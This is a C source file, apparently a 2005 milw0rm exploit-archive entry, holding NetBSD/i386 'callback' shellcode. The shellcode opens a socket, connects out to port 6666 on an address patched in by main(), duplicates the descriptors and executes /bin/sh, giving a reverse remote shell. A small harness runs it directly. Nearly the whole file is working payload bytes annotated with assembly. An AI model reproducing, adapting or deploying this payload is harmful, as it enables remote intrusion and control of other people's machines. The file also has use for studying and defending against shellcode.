/*
 *  minervini at neuralnoise dot com (c) 2005
 *  NetBSD/i386 2.0, callback shellcode (port 6666);
 */

#include <sys/types.h>
#include <stdio.h>
#include <string.h>

char scode[] =
  "\x31\xc0"             // xor    %eax,%eax
  "\x31\xc9"		 // xor    %ecx,%ecx
  "\x50"                 // push   %eax
  "\x40"                 // inc    %eax
  "\x50"                 // push   %eax
  "\x40"                 // inc    %eax
  "\x50"                 // push   %eax
  "\x50"                 // push   %eax
  "\xb0\x61"             // mov    $0x61,%al
  "\xcd\x80"             // int    $0x80
  "\x89\xc3"             // mov    %eax,%ebx
  "\x89\xe2"             // mov    %esp,%edx
  "\x49"                 // dec    %ecx
  "\x51"                 // push   %ecx
  "\x51"                 // push   %ecx
  "\x41"                 // inc    %ecx
  "\x68\xf5\xff\xff\xfd" // push   $0xfdfffff5
  "\x68\xff\xfd\xe5\xf5" // push   $0xf5e5fdff
  "\xb1\x10"             // mov    $0x10,%cl
  "\x51"                 // push   %ecx
  "\xf6\x12"             // notb   (%edx)
  "\x4a"                 // dec    %edx
  "\xe2\xfb"             // loop   .-3
  "\xf6\x12"             // notb   (%edx)
  "\x52"                 // push   %edx
  "\x50"                 // push   %eax
  "\x50"                 // push   %eax
  "\xb0\x62"             // mov    $0x62,%al
  "\xcd\x80"             // int    $0x80
  "\xb1\x03"             // mov    $0x3,%cl
  "\x49"                 // dec    %ecx
  "\x51"                 // push   %ecx
  "\x41"                 // inc    %ecx
  "\x53"                 // push   %ebx
  "\x50"                 // push   %eax
  "\xb0\x5a"             // mov    $0x5a,%al
  "\xcd\x80"             // int    $0x80
  "\xe2\xf5"             // loop   .-9
  "\x51"                 // push   %ecx
  "\x68\x2f\x2f\x73\x68" // push   $0x68732f2f
  "\x68\x2f\x62\x69\x6e" // push   $0x6e69622f
  "\x89\xe3"             // mov    %esp,%ebx
  "\x51"                 // push   %ecx
  "\x54"                 // push   %esp
  "\x53"                 // push   %ebx
  "\x50"                 // push   %eax
  "\xb0\x3b"             // mov    $0x3b,%al
  "\xcd\x80";            // int    $0x80

int main() {
   scode[23] = ~10;
   scode[24] = ~0;
   scode[25] = ~0;
   scode[26] = ~2;
   void (*code) () = (void *) scode;
   printf("length: %d\n", strlen(scode));
   code();
   return (0);
}

// milw0rm.com [2005-11-30]